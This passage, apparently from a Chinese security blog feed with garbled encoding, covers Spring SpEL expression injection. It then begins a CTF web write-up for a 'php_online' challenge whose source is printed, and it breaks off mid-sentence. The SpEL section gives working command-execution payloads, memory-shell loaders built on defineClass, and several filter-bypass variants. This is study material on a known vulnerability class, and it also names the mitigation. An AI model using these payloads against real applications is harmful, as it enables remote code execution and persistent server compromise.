2.è§£æè¡¨è¾¾å¼ parseExpression(your_expression) 3.æ„é€ ä¸Šä¸‹æ–‡ new StandardEvaluationContext() é»˜è®¤ä¸ºè¿™ä¸ª 4.æ±‚å€¼ expression.getValue(context)</p></blockquote><h3 id="æ¼æ´åˆ©ç”¨å‰æ"><a href="#æ¼æ´åˆ©ç”¨å‰æ" class="headerlink" title="æ¼æ´åˆ©ç”¨å‰æ"></a>æ¼æ´åˆ©ç”¨å‰æ</h3><blockquote><p>1.æœåŠ¡å™¨æ¥æ”¶ç”¨æˆ·è¾“å…¥çš„è¡¨è¾¾å¼ 2.è¡¨è¾¾å¼è§£æä¹‹åè°ƒç”¨äº†getValue 3.ä½¿ç”¨StandardEvaluationContextä½œä¸ºä¸Šä¸‹æ–‡å¯¹è±¡</p></blockquote><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-meta">@RestController</span><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">SpELController</span> &#123;<br>    <span class="hljs-meta">@GetMapping(&quot;spel&quot;)</span><br>    <span class="hljs-keyword">public</span> String <span class="hljs-title function_">spel</span><span class="hljs-params">(<span class="hljs-meta">@RequestParam(name=&quot;cmd&quot;)</span>String cmd)</span> &#123;<br>        System.out.println(<span class="hljs-string">&quot;Hello SpEL!!!&quot;</span>);<br>        <span class="hljs-type">ExpressionParser</span> <span class="hljs-variable">parser</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">SpelExpressionParser</span>();<br>        <span class="hljs-type">Expression</span> <span class="hljs-variable">expression</span> <span class="hljs-operator">=</span> parser.parseExpression(cmd);<br>        <span class="hljs-type">Object</span> <span class="hljs-variable">obj</span> <span class="hljs-operator">=</span> expression.getValue();<br>        <span class="hljs-keyword">return</span> obj.toString();<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>è¿™æ®µä»£ç ä¸­ï¼Œå¯æ³¨å…¥çš„ç‚¹åœ¨è¯·æ±‚å‚æ•°cmd è®¿é—®<code>http://localhost:8080/spel?cmd=T(java.lang.Runtime).getRuntime().exec(%27calc%27)</code> æˆåŠŸå¼¹å‡ºè®¡ç®—å™¨ã€‚</p><h3 id="æ³¨å…¥tricks"><a href="#æ³¨å…¥tricks" class="headerlink" title="æ³¨å…¥tricks"></a>æ³¨å…¥tricks</h3><p>ä¸€äº›trivialçš„payload</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">new</span> <span class="hljs-title class_">java</span>.lang.ProcessBuilder(<span class="hljs-keyword">new</span> <span class="hljs-title class_">String</span>[]&#123;<span class="hljs-string">&quot;caslc&quot;</span>&#125;).start()<br></code></pre></td></tr></table></figure><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs java">T(java.lang.Runtime).getRuntime().exec(<span class="hljs-string">&quot;calc&quot;</span>)<br></code></pre></td></tr></table></figure><p>å‘½ä»¤æ‰§è¡Œå¸¦è¿”å›ç»“æœçš„ï¼š</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">new</span> <span class="hljs-title class_">java</span>.io.BufferedReader(<span class="hljs-keyword">new</span> <span class="hljs-title class_">java</span>.io.InputStreamReader(<span class="hljs-keyword">new</span> <span class="hljs-title class_">ProcessBuilder</span>(<span class="hljs-string">&quot;whoami&quot;</span>).start().getInputStream())).readLine()<br></code></pre></td></tr></table></figure><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">new</span> <span class="hljs-title class_">java</span>.util.Scanner(T(java.lang.Runtime).getRuntime().exec(<span class="hljs-string">&quot;whoami&quot;</span>).getInputStream(), <span class="hljs-string">&quot;GBK&quot;</span>).useDelimiter(<span class="hljs-string">&quot;xxx&quot;</span>).next()<br></code></pre></td></tr></table></figure><p>åˆ©ç”¨jså¼•æ“å¯ä»¥å®ç°æ›´åŠ å¤æ‚çš„æ“ä½œï¼Œå¦‚æ³¨å…¥å†…å­˜é©¬</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> Exception &#123;<br>    <span class="hljs-type">byte</span>[] bytes = ClassPool.getDefault().get(<span class="hljs-string">&quot;EvilInterceptor&quot;</span>).toBytecode();<br>    <span class="hljs-type">String</span> <span class="hljs-variable">s</span> <span class="hljs-operator">=</span> Base64.getEncoder().encodeToString(bytes);<br>    <span class="hljs-type">String</span> <span class="hljs-variable">cmd</span> <span class="hljs-operator">=</span> <span class="hljs-string">&quot;T(javax.script.ScriptEngineManager).newInstance().getEngineByName(&#x27;js&#x27;).eval(\&quot;&quot;</span> + makeJsDefinedClass(<span class="hljs-string">&quot;EvilInterceptor&quot;</span>, s) + <span class="hljs-string">&quot;\&quot;)&quot;</span>;<br>    System.out.println(cmd);<br>&#125;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> String <span class="hljs-title function_">makeJsDefinedClass</span><span class="hljs-params">(String classname, String encoded)</span> &#123;<br>    <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;var data = &#x27;&quot;</span> + encoded + <span class="hljs-string">&quot;&#x27;;&quot;</span> +<br>        <span class="hljs-string">&quot;var bytes = java.util.Base64.getDecoder().decode(data);&quot;</span> +<br>        <span class="hljs-string">&quot;var cls = java.lang.Class.forName(&#x27;sun.nio.ch.Util&#x27;);&quot;</span> +<br>        <span class="hljs-string">&quot;var method = cls.getDeclaredMethod(&#x27;unsafe&#x27;);&quot;</span> +<br>        <span class="hljs-string">&quot;method.setAccessible(true);&quot;</span> +<br>        <span class="hljs-string">&quot;var unsafe = method.invoke(cls);&quot;</span> +<br>        <span class="hljs-string">&quot;var classLoader = java.lang.Thread.currentThread().getContextClassLoader();&quot;</span> +<br>        <span class="hljs-string">&quot;var evil = unsafe.defineClass(&#x27;&quot;</span> + classname + <span class="hljs-string">&quot;&#x27;, bytes, 0, bytes.length, classLoader, null);&quot;</span> +<br>        <span class="hljs-string">&quot;evil.newInstance();&quot;</span>;<br>&#125;<br></code></pre></td></tr></table></figure><p>è¿™é‡Œåˆ©ç”¨çš„æ˜¯<code>Unsafe</code>å»<code>defineClass</code>åŠ è½½å­—èŠ‚ç </p><p>å®é™…ä¸ŠSpringæ¡†æ¶ä¸­<code>org.springframework.cglib.core.ReflectUtils</code>å°±æä¾›äº†ä¸€ç³»åˆ—åå°„æœ‰å…³çš„æ–¹æ³•ï¼Œå…¶ä¸­å°±åŒ…æ‹¬äº†å­—èŠ‚ç åŠ è½½<code>defineClass</code>ã€‚</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-type">byte</span>[] bytes = ClassPool.getDefault().get(<span class="hljs-string">&quot;EvilInterceptor&quot;</span>).toBytecode();<br><span class="hljs-type">String</span> <span class="hljs-variable">s</span> <span class="hljs-operator">=</span> Base64.getEncoder().encodeToString(bytes);<br><span class="hljs-type">String</span> <span class="hljs-variable">cmd</span> <span class="hljs-operator">=</span> <span class="hljs-string">&quot;T(org.springframework.cglib.core.ReflectUtils).defineClass(&#x27;EvilInterceptor&#x27;,T(org.springframework.util.Base64Utils).decodeFromString(&#x27;&quot;</span> + s + <span class="hljs-string">&quot;&#x27;),T(java.lang.Thread).currentThread().getContextClassLoader()).newInstance()&quot;</span>;<br>System.out.println(cmd);<br></code></pre></td></tr></table></figure><p>é«˜ç‰ˆæœ¬JDKï¼ˆ&gt;&#x3D;9ï¼‰å¼•å…¥äº†å‘½åæ¨¡å—æœºåˆ¶ï¼Œ<code>java.*</code>ä¸‹çš„éå…¬å¼€å˜é‡å’Œæ–¹æ³•ä¸èƒ½è¢«å…¶ä»–æ¨¡å—ç›´æ¥è®¿é—®ï¼ŒJDK11è¿˜åªä¼šæç¤ºwarningï¼Œè€Œåœ¨JDK17ä¸­ä¼šå¼ºåˆ¶å¼€å¯ï¼Œç›´æ¥æŠ¥é”™</p><p>ä¸Šé¢çš„payloadæ‰§è¡Œåä¼šæŠ¥é”™</p><blockquote><p>java.lang.reflect.InaccessibleObjectException: Unable to make protected final java.lang.Class java.lang.ClassLoader.defineClass(java.lang.String,byte[],int,int,java.security.ProtectionDomain) throws java.lang.ClassFormatError accessible: module java.base does not â€œopens java.langâ€ to unnamed module @635eaaf1</p></blockquote><p><img src="/2024/08/22/El-Spel/image-20240822154752676.png" alt="image-20240822154752676"></p><p><code>java.lang.ClassLoader#defineClass</code>ä¸æ˜¯å…¬å¼€æ–¹æ³•ï¼Œæ— æ³•è¢«å…¶ä»–æ¨¡å—è®¿é—®</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-type">byte</span>[] bytes = ClassPool.getDefault().get(<span class="hljs-string">&quot;org.springframework.expression.EvilInterceptor&quot;</span>).toBytecode();<br><span class="hljs-type">String</span> <span class="hljs-variable">s</span> <span class="hljs-operator">=</span> Base64.getEncoder().encodeToString(bytes);<br><span class="hljs-type">String</span> <span class="hljs-variable">cmd</span> <span class="hljs-operator">=</span> <span class="hljs-string">&quot;T(org.springframework.cglib.core.ReflectUtils).defineClass(&#x27;org.springframework.expression.EvilInterceptor&#x27;,T(java.util.Base64).getDecoder().decode(&#x27;&quot;</span> + s + <span class="hljs-string">&quot;&#x27;),T(java.lang.Thread).currentThread().getContextClassLoader(), null, T(java.lang.Class).forName(&#x27;org.springframework.expression.ExpressionParser&#x27;))&quot;</span>;<br>System.out.println(cmd);<br></code></pre></td></tr></table></figure><h3 id="Patch"><a href="#Patch" class="headerlink" title="Patch"></a>Patch</h3><p><code>SimpleEvaluationContext</code>ã€<code>StandardEvaluationContext</code> æ˜¯ SpELæä¾›çš„ä¸¤ä¸ª <code>EvaluationContext</code></p><p><code>SimpleEvaluationContext</code> æ—¨åœ¨ä»…æ”¯æŒ SpEL è¯­è¨€è¯­æ³•çš„ä¸€ä¸ªå­é›†ã€‚å®ƒä¸åŒ…æ‹¬ Java ç±»å‹å¼•ç”¨ï¼Œæ„é€ å‡½æ•°å’Œ bean å¼•ç”¨</p><p>ç”¨<code>SimpleEvaluationContext</code>æ›¿æ¢é»˜è®¤çš„<code>StandardEvaluationContext</code>ï¼Œå°±èƒ½æœ‰æ•ˆé˜²æ­¢æ¶æ„SpELè¡¨è¾¾å¼çš„æ‰§è¡Œã€‚</p><h2 id="Bypass"><a href="#Bypass" class="headerlink" title="Bypass"></a>Bypass</h2><p><strong>åå°„</strong></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs java">T(String).getClass().forName(<span class="hljs-string">&quot;java.lang.Runtime&quot;</span>).getRuntime().exec(<span class="hljs-string">&quot;calc&quot;</span>)<br><span class="hljs-comment">// åŒä¸Šï¼Œéœ€è¦æœ‰ä¸Šä¸‹æ–‡ç¯å¢ƒ</span><br>#<span class="hljs-built_in">this</span>.getClass().forName(<span class="hljs-string">&quot;java.lang.Runtime&quot;</span>).getRuntime().exec(<span class="hljs-string">&quot;calc&quot;</span>)<br><span class="hljs-comment">// åå°„è°ƒç”¨+å­—ç¬¦ä¸²æ‹¼æ¥ï¼Œç»•è¿‡æ­£åˆ™è¿‡æ»¤</span><br>T(String).getClass().forName(<span class="hljs-string">&quot;java.l&quot;</span>+<span class="hljs-string">&quot;ang.Ru&quot;</span>+<span class="hljs-string">&quot;ntime&quot;</span>).getMethod(<span class="hljs-string">&quot;ex&quot;</span>+<span class="hljs-string">&quot;ec&quot;</span>,T(String[])).invoke(T(String).getClass().forName(<span class="hljs-string">&quot;java.l&quot;</span>+<span class="hljs-string">&quot;ang.Ru&quot;</span>+<span class="hljs-string">&quot;ntime&quot;</span>).getMethod(<span class="hljs-string">&quot;getRu&quot;</span>+<span class="hljs-string">&quot;ntime&quot;</span>).invoke(T(String).getClass().forName(<span class="hljs-string">&quot;java.l&quot;</span>+<span class="hljs-string">&quot;ang.Ru&quot;</span>+<span class="hljs-string">&quot;ntime&quot;</span>)),<span class="hljs-keyword">new</span> <span class="hljs-title class_">String</span>[]&#123;<span class="hljs-string">&quot;cmd&quot;</span>,<span class="hljs-string">&quot;/C&quot;</span>,<span class="hljs-string">&quot;calc&quot;</span>&#125;)<br><span class="hljs-comment">// åŒä¸Šï¼Œéœ€è¦æœ‰ä¸Šä¸‹æ–‡ç¯å¢ƒ</span><br>#<span class="hljs-built_in">this</span>.getClass().forName(<span class="hljs-string">&quot;java.l&quot;</span>+<span class="hljs-string">&quot;ang.Ru&quot;</span>+<span class="hljs-string">&quot;ntime&quot;</span>).getMethod(<span class="hljs-string">&quot;ex&quot;</span>+<span class="hljs-string">&quot;ec&quot;</span>,T(String[])).invoke(T(String).getClass().forName(<span class="hljs-string">&quot;java.l&quot;</span>+<span class="hljs-string">&quot;ang.Ru&quot;</span>+<span class="hljs-string">&quot;ntime&quot;</span>).getMethod(<span class="hljs-string">&quot;getRu&quot;</span>+<span class="hljs-string">&quot;ntime&quot;</span>).invoke(T(String).getClass().forName(<span class="hljs-string">&quot;java.l&quot;</span>+<span class="hljs-string">&quot;ang.Ru&quot;</span>+<span class="hljs-string">&quot;ntime&quot;</span>)),<span class="hljs-keyword">new</span> <span class="hljs-title class_">String</span>[]&#123;<span class="hljs-string">&quot;cmd&quot;</span>,<span class="hljs-string">&quot;/C&quot;</span>,<span class="hljs-string">&quot;calc&quot;</span>&#125;)<br></code></pre></td></tr></table></figure><p><strong>å­—ç¬¦ç¼–ç </strong></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-comment">// Stringç±»åŠ¨æ€ç”Ÿæˆå­—ç¬¦</span><br><span class="hljs-keyword">new</span> <span class="hljs-title class_">java</span>.lang.ProcessBuilder(<span class="hljs-keyword">new</span> <span class="hljs-title class_">java</span>.lang.String(<span class="hljs-keyword">new</span> <span class="hljs-title class_">byte</span>[]&#123;<span class="hljs-number">99</span>,<span class="hljs-number">97</span>,<span class="hljs-number">108</span>,<span class="hljs-number">99</span>&#125;)).start()<br><span class="hljs-comment">// charè½¬å­—ç¬¦ä¸²ï¼Œå†å­—ç¬¦ä¸²concat</span><br>T(java.lang.Runtime).getRuntime().exec(T(java.lang.Character).toString(<span class="hljs-number">99</span>).concat(T(java.lang.Character).toString(<span class="hljs-number">97</span>)).concat(T(java.lang.Character).toString(<span class="hljs-number">108</span>)).concat(T(java.lang.Character).toString(<span class="hljs-number">99</span>)))<br></code></pre></td></tr></table></figure><p><strong>å­—ç¬¦ä¸²æ‹¼æ¥</strong></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs java">T(String).getClass().forName(<span class="hljs-string">&quot;java.l&quot;</span>+<span class="hljs-string">&quot;ang.Ru&quot;</span>+<span class="hljs-string">&quot;ntime&quot;</span>).getMethod(<span class="hljs-string">&quot;ex&quot;</span>+<span class="hljs-string">&quot;ec&quot;</span>,T(String[])).invoke(T(String).getClass().forName(<span class="hljs-string">&quot;java.l&quot;</span>+<span class="hljs-string">&quot;ang.Ru&quot;</span>+<span class="hljs-string">&quot;ntime&quot;</span>).getMethod(<span class="hljs-string">&quot;getRu&quot;</span>+<span class="hljs-string">&quot;ntime&quot;</span>).invoke(T(String).getClass().forName(<span class="hljs-string">&quot;java.l&quot;</span>+<span class="hljs-string">&quot;ang.Ru&quot;</span>+<span class="hljs-string">&quot;ntime&quot;</span>)),<span class="hljs-keyword">new</span> <span class="hljs-title class_">String</span>[]&#123;<span class="hljs-string">&quot;cmd&quot;</span>,<span class="hljs-string">&quot;/C&quot;</span>,<span class="hljs-string">&quot;calc&quot;</span>&#125;)<br></code></pre></td></tr></table></figure><p><strong>JavaScriptå¼•æ“</strong></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs java">T(javax.script.ScriptEngineManager).newInstance().getEngineByName(<span class="hljs-string">&quot;nashorn&quot;</span>).eval(<span class="hljs-string">&quot;s=[3];s[0]=&#x27;cmd&#x27;;s[1]=&#x27;/C&#x27;;s[2]=&#x27;calc&#x27;;java.la&quot;</span>+<span class="hljs-string">&quot;ng.Run&quot;</span>+<span class="hljs-string">&quot;time.getRu&quot;</span>+<span class="hljs-string">&quot;ntime().ex&quot;</span>+<span class="hljs-string">&quot;ec(s);&quot;</span>)T(org.springframework.util.StreamUtils).copy(T(javax.script.ScriptEngineManager).newInstance().getEngineByName(<span class="hljs-string">&quot;JavaScript&quot;</span>).eval(<span class="hljs-string">&quot;xxx&quot;</span>),)<br></code></pre></td></tr></table></figure><p><strong>ç»•è¿‡T( è¿‡æ»¤</strong></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-comment">//%00ä¼šè¢«ç›´æ¥æ›¿æ¢ä¸ºç©º</span><br>T%<span class="hljs-number">00</span>(<span class="hljs-keyword">new</span>)<br></code></pre></td></tr></table></figure><p><strong>ç»•è¿‡getClass(è¿‡æ»¤</strong></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-string">&#x27;&#x27;</span>.getClass æ›¿æ¢ä¸º <span class="hljs-string">&#x27;&#x27;</span>.class.getSuperclass().class<br><span class="hljs-string">&#x27;&#x27;</span>.class.getSuperclass().class.forName(<span class="hljs-string">&#x27;java.lang.Runtime&#x27;</span>).getDeclaredMethods()[<span class="hljs-number">14</span>].invoke(<span class="hljs-string">&#x27;&#x27;</span>.class.getSuperclass().class.forName(<span class="hljs-string">&#x27;java.lang.Runtime&#x27;</span>).getDeclaredMethods()[<span class="hljs-number">7</span>].invoke(<span class="hljs-literal">null</span>),<span class="hljs-string">&#x27;calc&#x27;</span>)<br></code></pre></td></tr></table></figure><p><strong>ä½¿ç”¨Springå·¥å…·ç±»ï¼Œå¯æ‰“å†…å­˜é©¬</strong></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-comment">//ååºåˆ—åŒ–</span><br>T(org.springframework.util.SerializationUtils).deserialize(T(com.sun.org.apache.xml.internal.security.utils.Base64).decode(<span class="hljs-string">&#x27;rO0AB...&#x27;</span>))<br><span class="hljs-comment">// æ‰§è¡Œè‡ªå®šä¹‰ç±»çš„é™æ€ä»£ç å—</span><br>T(org.springframework.cglib.core.ReflectUtils).defineClass(<span class="hljs-string">&#x27;Singleton&#x27;</span>,T(com.sun.org.apache.xml.internal.security.utils.Base64).decode(<span class="hljs-string">&#x27;yv66vgAAADIAtQ....&#x27;</span>),T(org.springframework.util.ClassUtils).getDefaultClassLoader())<br></code></pre></td></tr></table></figure><p>å‚è€ƒï¼š</p><p><a href="https://www.cnblogs.com/bitterz/p/15206255.html">https://www.cnblogs.com/bitterz/p/15206255.html</a></p><p><a href="https://www.exploit-db.com/docs/english/46303-remote-code-execution-with-el-injection-vulnerabilities.pdf">https://www.exploit-db.com/docs/english/46303-remote-code-execution-with-el-injection-vulnerabilities.pdf</a></p><p><a href="https://owasp.org/www-community/vulnerabilities/Expression_Language_Injection">https://owasp.org/www-community/vulnerabilities/Expression_Language_Injection</a><br><a href="http://www.cnblogs.com/bitterz/p/15206255.html">www.cnblogs.com/bitterz/p/15206255.html</a></p><p><a href="https://blog.csdn.net/weixin_43610673/article/details/125941767?spm=1001.2014.3001.5501">Javawebå®‰å…¨â€”â€”è¡¨è¾¾å¼æ³¨å…¥ï¼ˆEL+SpELï¼‰-CSDNåšå®¢</a></p><p><a href="https://p4d0rn.gitbook.io/java/others/spel">Spel Attack | Java (gitbook.io)</a></p><p><a href="https://p4d0rn.gitbook.io/java/others/elattack">El Attack | Java (gitbook.io)</a></p>]]></content>
    
    
    
    <tags>
      
      <tag>Java</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>å·…å³°æå®¢2024-åˆèµ›-web-éƒ¨åˆ†wp</title>
    <link href="/2024/08/17/%E5%B7%85%E5%B3%B0%E6%9E%81%E5%AE%A22024-%E5%88%9D%E8%B5%9B-web-%E9%83%A8%E5%88%86wp/"/>
    <url>/2024/08/17/%E5%B7%85%E5%B3%B0%E6%9E%81%E5%AE%A22024-%E5%88%9D%E8%B5%9B-web-%E9%83%A8%E5%88%86wp/</url>
    
    <content type="html"><![CDATA[<p>å¯æƒœã€‚</p><p>ä¸å¤šè¯´äº†ï¼Œçœ‹çœ‹å§ã€‚</p><h2 id="php-online"><a href="#php-online" class="headerlink" title="php_online"></a>php_online</h2><p>å®¡è®¡ä¸€ä¸‹æºç ï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> flask <span class="hljs-keyword">import</span> Flask, request, session, redirect, url_for, render_template<br><span class="hljs-keyword">import</span> os<br><span class="hljs-keyword">import</span> secrets<br><br><br>app = Flask(__name__)<br>app.secret_key = secrets.token_hex(<span class="hljs-number">16</span>)<br>working_id = []<br><br><br><span class="hljs-meta">@app.route(<span class="hljs-params"><span class="hljs-string">&#x27;/&#x27;</span>, methods=[<span class="hljs-string">&#x27;GET&#x27;</span>, <span class="hljs-string">&#x27;POST&#x27;</span>]</span>)</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">index</span>():<br>    <span class="hljs-keyword">if</span> request.method == <span class="hljs-string">&#x27;POST&#x27;</span>:<br>        <span class="hljs-built_in">id</span> = request.form[<span class="hljs-string">&#x27;id&#x27;</span>]<br>        <span class="hljs-keyword">if</span> <span class="hljs-keyword">not</span> <span class="hljs-built_in">id</span>.isalnum() <span class="hljs-keyword">or</span> <span class="hljs-built_in">len</span>(<span class="hljs-built_in">id</span>) != <span class="hljs-number">8</span>:<br>            <span class="hljs-keyword">return</span> <span class="hljs-string">&#x27;æ— æ•ˆçš„ID&#x27;</span><br>        session[<span class="hljs-string">&#x27;id&#x27;</span>] = <span class="hljs-built_in">id</span><br>        <span class="hljs-keyword">if</span> <span class="hljs-keyword">not</span> os.path.exists(<span class="hljs-string">f&#x27;/sandbox/<span class="hljs-subst">&#123;<span class="hljs-built_in">id</span>&#125;</span>&#x27;</span>):<br>            os.popen(<span class="hljs-string">f&#x27;mkdir /sandbox/<span class="hljs-subst">&#123;<span class="hljs-built_in">id</span>&#125;</span> &amp;&amp; chown www-data /sandbox/<span class="hljs-subst">&#123;<span class="hljs-built_in">id</span>&#125;</span> &amp;&amp; chmod a+w /sandbox/<span class="hljs-subst">&#123;<span class="hljs-built_in">id</span>&#125;</span>&#x27;</span>).read()<br>        <span class="hljs-keyword">return</span> redirect(url_for(<span class="hljs-string">&#x27;sandbox&#x27;</span>))<br>    <span class="hljs-keyword">return</span> render_template(<span class="hljs-string">&#x27;submit_id.html&#x27;</span>)<br><br><br><span class="hljs-meta">@app.route(<span class="hljs-params"><span class="hljs-string">&#x27;/sandbox&#x27;</span>, methods=[<span class="hljs-string">&#x27;GET&#x27;</span>, <span class="hljs-string">&#x27;POST&#x27;</span>]</span>)</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">sandbox</span>():<br>    <span class="hljs-keyword">if</span> request.method == <span class="hljs-string">&#x27;GET&#x27;</span>:<br>        <span class="hljs-keyword">if</span> <span class="hljs-string">&#x27;id&#x27;</span> <span class="hljs-keyword">not</span> <span class="hljs-keyword">in</span> session:<br>            <span class="hljs-keyword">return</span> redirect(url_for(<span class="hljs-string">&#x27;index&#x27;</span>))<br>        <span class="hljs-keyword">else</span>:<br>            <span class="hljs-keyword">return</span> render_template(<span class="hljs-string">&#x27;submit_code.html&#x27;</span>)<br>    <span class="hljs-keyword">if</span> request.method == <span class="hljs-string">&#x27;POST&#x27;</span>:<br>        <span class="hljs-keyword">if</span> <span class="hljs-string">&#x27;id&#x27;</span> <span class="hljs-keyword">not</span> <span class="hljs-keyword">in</span> session:<br>            <span class="hljs-keyword">return</span> <span class="hljs-string">&#x27;no id&#x27;</span><br>        user_id = session[<span class="hljs-string">&#x27;id&#x27;</span>]<br>        <span class="hljs-keyword">if</span> user_id <span class="hljs-keyword">in</span> working_id:<br>            <span class="hljs-keyword">return</span> <span class="hljs-string">&#x27;task is still running&#x27;</span><br>        <span class="hljs-keyword">else</span>:<br>            working_id.append(user_id)<br>            code = request.form.get(<span class="hljs-string">&#x27;code&#x27;</span>)<br>            os.popen(<span class="hljs-string">f&#x27;cd /sandbox/<span class="hljs-subst">&#123;user_id&#125;</span> &amp;&amp; rm *&#x27;</span>).read()<br>            os.popen(<span class="hljs-string">f&#x27;sudo -u www-data cp /app/init.py /sandbox/<span class="hljs-subst">&#123;user_id&#125;</span>/init.py &amp;&amp; cd /sandbox/<span class="hljs-subst">&#123;user_id&#125;</span> &amp;&amp; sudo -u www-data python3 init.py&#x27;</span>).read()<br>            os.popen(<span class="hljs-string">f&#x27;rm -rf /sandbox/<span class="hljs-subst">&#123;user_id&#125;</span>/phpcode&#x27;</span>).read()<br>            <br>            php_file = <span class="hljs-built_in">open</span>(<span class="hljs-string">f&#x27;/sandbox/<span class="hljs-subst">&#123;user_id&#125;</span>/phpcode&#x27;</span>, <span class="hljs-string">&#x27;w&#x27;</span>)<br>            php_file.write(code)<br>            php_file.close()<br><br>            result = os.popen(<span class="hljs-string">f&#x27;cd /sandbox/<span class="hljs-subst">&#123;user_id&#125;</span> &amp;&amp; sudo -u nobody php phpcode&#x27;</span>).read()<br>            os.popen(<span class="hljs-string">f&#x27;cd /sandbox/<span class="hljs-subst">&#123;user_id&#125;</span> &amp;&amp; rm *&#x27;</span>).read()<br>            working_id.remove(user_id)<br><br>            <span class="hljs-keyword">return</span> result<br><br><br><span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&#x27;__main__&#x27;</span>:<br>    app.run(debug=<span class="hljs-literal">False</span>, host=<span class="hljs-string">&#x27;0.0.0.0&#x27;</span>, port=<span class="hljs-number">80</span>)<br></code></pre></td></tr></table></figure><p>å…¶å®è¿™é“é¢˜ä¸ç®—éš¾ï¼Œåšæ³•ä¹Ÿå¾ˆå¤šï¼Œå…±åŒç‚¹æ˜¯åˆ©ç”¨<code>rm *</code>æ— æ³•åˆ 